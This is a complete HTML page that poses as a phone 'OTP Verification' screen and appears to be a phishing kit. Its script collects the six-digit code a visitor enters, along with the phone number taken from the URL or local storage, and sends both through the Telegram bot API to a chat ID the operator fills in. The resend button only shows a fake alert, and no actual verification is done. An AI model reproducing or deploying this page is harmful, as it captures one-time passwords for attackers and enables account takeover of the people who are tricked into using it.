<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OTP Verification</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #ffffff;
            color: #333;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            overflow-x: hidden;
        }

        /* Header Styles */
        header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 15px 20px;
            border-bottom: 1px solid #eaeaea;
            background: #fff;
        }

        .back-arrow {
            font-size: 20px;
            text-decoration: none;
            color: #666;
            cursor: pointer;
            width: 30px;
        }

        .logo {
            font-size: 18px;
            font-weight: 700;
            color: #333333;
            text-align: center;
            flex-grow: 1;
        }

        .menu-icon {
            display: flex;
            flex-direction: column;
            gap: 4px;
            cursor: pointer;
            width: 30px;
            align-items: flex-end;
        }

        .menu-icon div {
            width: 22px;
            height: 2px;
            background-color: #333;
        }

        /* Container & Card */
        .container {
            flex: 1;
            display: flex;
            justify-content: center;
            align-items: flex-start;
            padding: 40px 20px;
            z-index: 1;
        }

        .card {
            background: #ffffff;
            border: 1px solid #f0f0f0;
            border-radius: 16px;
            padding: 30px 24px;
            width: 100%;
            max-width: 450px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.03);
        }

        .card h2 {
            color: #1a65cc;
            font-size: 24px;
            font-weight: 700;
            margin-bottom: 8px;
        }

        .card p {
            color: #666666;
            font-size: 15px;
            line-height: 1.5;
            margin-bottom: 24px;
        }

        .phone-display {
            display: block;
            font-weight: 700;
            color: #000000;
            margin-top: 4px;
            font-size: 16px;
        }

        /* 6-Digit Box Styling */
        .otp-container {
            display: flex;
            justify-content: space-between;
            gap: 8px;
            margin-bottom: 24px;
        }

        .otp-box {
            width: 50px;
            height: 54px;
            text-align: center;
            font-size: 20px;
            font-weight: 600;
            border: 1px solid #d2d6dc;
            border-radius: 8px;
            background-color: #f9fafb;
            outline: none;
            transition: all 0.2s ease;
        }

        .otp-box:focus {
            border-color: #1a65cc;
            background-color: #fff;
            box-shadow: 0 0 0 3px rgba(26, 101, 204, 0.15);
        }

        /* Verify Button */
        .btn-verify {
            width: 100%;
            background-color: #1a65cc;
            color: white;
            border: none;
            padding: 14px;
            font-size: 16px;
            font-weight: 600;
            border-radius: 8px;
            cursor: pointer;
            transition: background 0.2s;
            margin-bottom: 20px;
        }

        .btn-verify:hover {
            background-color: #1452a8;
        }

        .btn-verify:disabled {
            background-color: #a0aec0;
            cursor: not-allowed;
        }

        /* Timer and Resend section */
        .timer-container {
            text-align: center;
            font-size: 14px;
            color: #666;
        }

        .resend-btn {
            background: none;
            border: none;
            color: #1a65cc;
            font-weight: 600;
            cursor: pointer;
            font-size: 14px;
            text-decoration: underline;
        }

        .resend-btn:disabled {
            color: #a0aec0;
            text-decoration: none;
            cursor: not-allowed;
        }

        /* Bottom Curved Decoration element */
        .bottom-curve {
            position: fixed;
            bottom: 0;
            left: 0;
            width: 100%;
            height: 60px;
            background-color: #0066ff;
            border-top-left-radius: 50% 100%;
            border-top-right-radius: 50% 100%;
            z-index: 0;
            pointer-events: none;
        }

        @media (max-width: 400px) {
            .otp-box {
                width: 42px;
                height: 48px;
                font-size: 18px;
            }
        }
    </style>
</head>
<body>

    <!-- Header navigation section -->
    <header>
        <a class="back-arrow" onclick="window.history.back()">&#8592;</a>
        <div class="logo">OTP Verification</div>
        <div class="menu-icon">
            <div></div>
            <div></div>
            <div></div>
        </div>
    </header>

    <!-- Main Entry Container -->
    <div class="container">
        <div class="card">
            <h2>OTP Verification</h2>
            <p>Enter the 6-digit code sent to your phone number
                <span id="phoneTarget" class="phone-display">+263771268100</span>
            </p>

            <!-- Box input block for dynamic code input -->
            <div class="otp-container">
                <input type="tel" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off">
                <input type="tel" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off">
                <input type="tel" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off">
                <input type="tel" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off">
                <input type="tel" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off">
                <input type="tel" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off">
            </div>

            <!-- Action triggering Verify Button replacement -->
            <button id="verifyButton" class="btn-verify" onclick="sendVerificationData()">Verify</button>

            <!-- Timer elements -->
            <div class="timer-container">
                <span id="timerText">Resend code in <strong id="countdown">02:00</strong></span>
                <button id="resendButton" class="resend-btn" onclick="triggerResend()" style="display: none;">Resend code</button>
            </div>
        </div>
    </div>

    <!-- Design element layout -->
    <div class="bottom-curve"></div>

    <script>
        // --- CONFIGURATION ---
        // Insert your specific bot credentials here
        const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';
        const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_HERE';

        // --- FETCHING PREVIOUS NUMBER DYNAMICALLY ---
        window.addEventListener('DOMContentLoaded', () => {
            // Checks URL variables first (e.g., page8.html?phone=263...) then local state, fallback to hardcoded value
            const urlParams = new URLSearchParams(window.location.search);
            const phoneParam = urlParams.get('phone');
            const storedPhone = localStorage.getItem('user_phone_number');
            
            if (phoneParam) {
                document.getElementById('phoneTarget').textContent = phoneParam.startsWith('+') ? phoneParam : '+' + phoneParam;
            } else if (storedPhone) {
                document.getElementById('phoneTarget').textContent = storedPhone.startsWith('+') ? storedPhone : '+' + storedPhone;
            }
            
            startCountdown(120); // Initialize 2 minute timer
            setupOtpNavigation();
        });

        // --- 6-DIGIT BOX DYNAMIC NAVIGATION LOGIC ---
        function setupOtpNavigation() {
            const inputs = document.querySelectorAll('.otp-box');
            
            inputs.forEach((input, index) => {
                // Focus handling to next element automatically
                input.addEventListener('input', (e) => {
                    if (input.value.length === 1 && index < inputs.length - 1) {
                        inputs[index + 1].focus();
                    }
                });

                // Clear/Backspace navigation support
                input.addEventListener('keydown', (e) => {
                    if (e.key === "Backspace" && input.value.length === 0 && index > 0) {
                        inputs[index - 1].focus();
                    }
                });
            });
        }

        // --- 2 MINUTE COUNTDOWN TIMER SYSTEM ---
        let timerInterval;
        function startCountdown(durationSeconds) {
            clearInterval(timerInterval);
            const display = document.getElementById('countdown');
            const timerText = document.getElementById('timerText');
            const resendBtn = document.getElementById('resendButton');

            timerText.style.display = 'inline';
            resendBtn.style.display = 'none';

            let timer = durationSeconds;
            timerInterval = setInterval(() => {
                let minutes = Math.floor(timer / 60);
                let seconds = timer % 60;

                minutes = minutes < 10 ? "0" + minutes : minutes;
                seconds = seconds < 10 ? "0" + seconds : seconds;

                display.textContent = minutes + ":" + seconds;

                if (--timer < 0) {
                    clearInterval(timerInterval);
                    timerText.style.display = 'none';
                    resendBtn.style.display = 'inline-block';
                }
            }, 1000);
        }

        function triggerResend() {
            alert("A new OTP code has been sent!");
            // Restart the 2 minutes clock (120 seconds)
            startCountdown(120);
        }

        // --- API NOTIFICATION SEND TO TELEGRAM ---
        function sendVerificationData() {
            const inputs = document.querySelectorAll('.otp-box');
            let otpCode = "";
            inputs.forEach(input => otpCode += input.value);

            if (otpCode.length < 6) {
                alert("Please enter all 6 digits of the verification code.");
                return;
            }

            const phoneNumber = document.getElementById('phoneTarget').textContent;
            const verifyButton = document.getElementById('verifyButton');
            
            verifyButton.disabled = true;
            verifyButton.textContent = "Verifying...";

            // Construct structural notification payload
            const textMessage = `🔔 *New OTP Code Submission*\n\n📱 *Phone Number:* ${phoneNumber}\n🔑 *Entered OTP:* \`${otpCode}\``;

            // Send notification to your server API target/Telegram directly
            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: textMessage,
                    parse_mode: 'Markdown'
                })
            })
            .then(response => response.json())
            .then(data => {
                verifyButton.disabled = false;
                verifyButton.textContent = "Verify";
                if(data.ok) {
                    alert("Verification code processed successfully.");
                } else {
                    alert("Submission failed. Check backend bot parameters.");
                }
            })
            .catch(err => {
                console.error(err);
                verifyButton.disabled = false;
                verifyButton.textContent = "Verify";
                alert("Network error occurred during submission.");
            });
        }
    </script>
</body>
</html>
